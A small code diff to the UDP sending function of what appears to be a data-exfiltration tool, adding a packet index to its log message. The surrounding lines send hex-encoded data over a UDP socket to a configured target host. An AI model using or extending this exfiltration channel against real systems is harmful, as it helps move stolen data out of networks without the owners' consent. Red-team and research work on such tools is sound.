@@ -13,8 +13,9 @@ def send(data):
     else:
         target = config['target']
     port = config['port']
+    packet_index = data.split('|!|')[1]
     app_exfiltrate.log_message(
-        'info', "[udp] Sending {0} bytes to {1}".format(len(data), target))
+        'info', "[udp] Sending {0} bytes with UDP packet to {1}. PacketIndex = {2}".format(len(data), target, packet_index))
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     client_socket.sendto(data.encode('hex'), (target, port))
 
